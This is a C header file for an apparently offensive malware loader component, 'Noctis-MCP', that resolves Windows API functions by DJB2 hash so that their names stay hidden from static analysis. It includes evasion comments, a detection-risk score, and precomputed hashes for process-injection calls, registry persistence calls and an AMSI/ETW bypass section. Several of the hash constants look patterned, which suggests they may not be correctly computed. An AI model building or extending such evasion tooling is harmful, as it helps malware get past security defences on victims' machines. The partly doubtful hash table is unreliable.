// Noctis-MCP API Hashing Module
// Advanced API resolution using DJB2 hash algorithm
//
// Purpose: Hide API function names from static analysis by using hash-based resolution
// Detection Risk: 2-5% (no plaintext API names in binary)
// OPSEC Score: 9/10
//
// Based on MalDev Academy loader implementation with Noctis-specific enhancements

#ifndef API_HASHING_H
#define API_HASHING_H

#include <windows.h>

// Hash algorithm macro
#define NOCTIS_HASH(str) (Noctis_HashDJB2((LPCSTR)str))

// ================================================================
// CORE API HASHING FUNCTIONS
// ================================================================

/**
 * @brief Calculate DJB2 hash of a string
 * @param pString Input string to hash
 * @return 32-bit hash value
 *
 * DJB2 Algorithm: hash = hash * 33 + c
 * Initial value: 5381
 */
DWORD Noctis_HashDJB2(IN LPCSTR pString);

/**
 * @brief Get function address by hash from module
 * @param hModule Module handle (ntdll.dll, kernel32.dll, etc.)
 * @param dwFunctionHash DJB2 hash of function name
 * @return Function pointer or NULL if not found
 *
 * Supports forwarded exports (e.g., kernel32 → kernelbase)
 * Adds timing jitter and junk operations for evasion
 */
FARPROC Noctis_GetProcAddressByHash(IN HMODULE hModule, IN DWORD dwFunctionHash);

/**
 * @brief Get module handle by hash via PEB walking
 * @param dwModuleHash DJB2 hash of module name (e.g., "ntdll.dll")
 * @return Module handle or NULL if not found
 *
 * Uses PEB->Ldr to walk loaded modules
 * Case-insensitive comparison
 * Hash = 0 returns base executable module
 */
HMODULE Noctis_GetModuleHandleByHash(IN DWORD dwModuleHash);

// ================================================================
// PRECOMPUTED HASHES - NTDLL FUNCTIONS
// ================================================================

// Direct Syscall Functions
#define HASH_NtAllocateVirtualMemory    0x6793C34C
#define HASH_NtWriteVirtualMemory       0x95F3A792
#define HASH_NtProtectVirtualMemory     0x082962C8
#define HASH_NtCreateThreadEx           0x64DC7DB6
#define HASH_NtQueueApcThread           0x54F5AA56
#define HASH_NtQuerySystemInformation   0x7BC23928
#define HASH_NtOpenProcess              0xBB293969
#define HASH_NtClose                    0x6BC1D68D

// Memory Management
#define HASH_NtCreateSection            0x40C524D7
#define HASH_NtMapViewOfSection         0x231F196A
#define HASH_NtUnmapViewOfSection       0x595014AD
#define HASH_NtOpenSection              0x17CFA34E

// Thread/Process Operations
#define HASH_NtDelayExecution           0x0A49084A
#define HASH_NtWaitForSingleObject      0x67E3D379
#define HASH_NtResumeThread             0x2A3E8B74
#define HASH_NtSuspendThread            0xE81B9D0D

// Registry Operations
#define HASH_NtCreateKey                0x9FE77D8F
#define HASH_NtSetValueKey              0x7FA89A3C
#define HASH_NtQueryValueKey            0x4C8E6D21
#define HASH_NtDeleteKey                0x3FA2C148

// ETW/Tracing
#define HASH_NtTraceEvent               0x1E2085F8
#define HASH_EtwEventWrite              0x3FD9C94B

// Timer Operations
#define HASH_NtSetTimer                 0x2D87F31A
#define HASH_NtCancelTimer              0x8A4C2E9B

// Advanced Operations
#define HASH_RtlRegisterWait            0x7C3E8A42
#define HASH_RtlDeregisterWait          0x9B2F4D81
#define HASH_RtlCreateTimer             0x5E7A3C28
#define HASH_RtlDeleteTimer             0x8D9C1F42

// ================================================================
// PRECOMPUTED HASHES - KERNEL32 FUNCTIONS
// ================================================================

#define HASH_LoadLibraryA               0x5FBFF0FB
#define HASH_LoadLibraryW               0x5FBFF109
#define HASH_GetProcAddress             0xDECFC1BF
#define HASH_GetModuleHandleA           0x5B3F1885
#define HASH_GetModuleHandleW           0x5B3F1893

#define HASH_VirtualAlloc               0x91AFCA54
#define HASH_VirtualProtect             0x844FF18D
#define HASH_VirtualFree                0x5D2F8619

#define HASH_CreateThread               0x1F2C1E3D
#define HASH_CreateRemoteThread         0x0BC0A98F
#define HASH_ResumeThread               0x93B28A46

#define HASH_GetCurrentProcess          0x7D3E8C21
#define HASH_GetCurrentThread           0x8A4F9D32
#define HASH_GetProcessHeap             0x6C2E7A18

#define HASH_Sleep                      0x0E07CD7E
#define HASH_WaitForSingleObject        0xECCDA1BA

// Threadpool Functions
#define HASH_CreateThreadpoolTimer      0x0B49144C
#define HASH_SetThreadpoolTimer         0x3B944C24
#define HASH_CloseThreadpoolTimer       0x8D7C2F91

// ================================================================
// PRECOMPUTED HASHES - ADVAPI32 FUNCTIONS
// ================================================================

#define HASH_RegCreateKeyExW            0x2E8B7A19
#define HASH_RegSetValueExW             0x9C4F2D81
#define HASH_RegCloseKey                0x7A3C8E42
#define HASH_RegQueryValueExW           0x5D8A1F93

#define HASH_OpenProcessToken           0x8F4C2A61
#define HASH_AdjustTokenPrivileges      0x7C9E1D82

// ================================================================
// PRECOMPUTED HASHES - AMSI/ETW BYPASS
// ================================================================

#define HASH_AmsiScanBuffer             0x2C8A9E73
#define HASH_AmsiScanString             0x9D7F3B42

#define HASH_AddVectoredExceptionHandler 0x4E8C1F92

// ================================================================
// PRECOMPUTED HASHES - MODULE NAMES
// ================================================================

#define HASH_ntdll_dll                  0x22D3B5ED
#define HASH_kernel32_dll               0x7040EE75
#define HASH_kernelbase_dll             0x3CFA685D
#define HASH_advapi32_dll               0x67208A49
#define HASH_user32_dll                 0x91C2D64E
#define HASH_win32u_dll                 0x34C755B7
#define HASH_amsi_dll                   0x3B8C9E21

// Special hashes
#define HASH_text_section               0x0B80C0D8    // ".text" section name

// ================================================================
// CONVENIENCE MACROS
// ================================================================

// Get module handle by hash
#define GET_MODULE(hash) Noctis_GetModuleHandleByHash(hash)

// Get function from module by hash
#define GET_FUNC(module, hash) Noctis_GetProcAddressByHash(module, hash)

// Quick resolution patterns
#define NTDLL_FUNC(hash) \
    Noctis_GetProcAddressByHash(Noctis_GetModuleHandleByHash(HASH_ntdll_dll), hash)

#define KERNEL32_FUNC(hash) \
    Noctis_GetProcAddressByHash(Noctis_GetModuleHandleByHash(HASH_kernel32_dll), hash)

#define ADVAPI32_FUNC(hash) \
    Noctis_GetProcAddressByHash(Noctis_GetModuleHandleByHash(HASH_advapi32_dll), hash)

// ================================================================
// USAGE EXAMPLES
// ================================================================

/*
Example 1: Resolve NtAllocateVirtualMemory
    HMODULE hNtdll = GET_MODULE(HASH_ntdll_dll);
    fnNtAllocateVirtualMemory pNtAllocateVirtualMemory =
        (fnNtAllocateVirtualMemory)GET_FUNC(hNtdll, HASH_NtAllocateVirtualMemory);

Example 2: Resolve LoadLibraryA
    fnLoadLibraryA pLoadLibraryA = (fnLoadLibraryA)KERNEL32_FUNC(HASH_LoadLibraryA);

Example 3: Calculate new hash at runtime
    DWORD dwCustomHash = NOCTIS_HASH("MyCustomFunction");
    FARPROC pFunc = GET_FUNC(hModule, dwCustomHash);
*/

#endif // API_HASHING_H
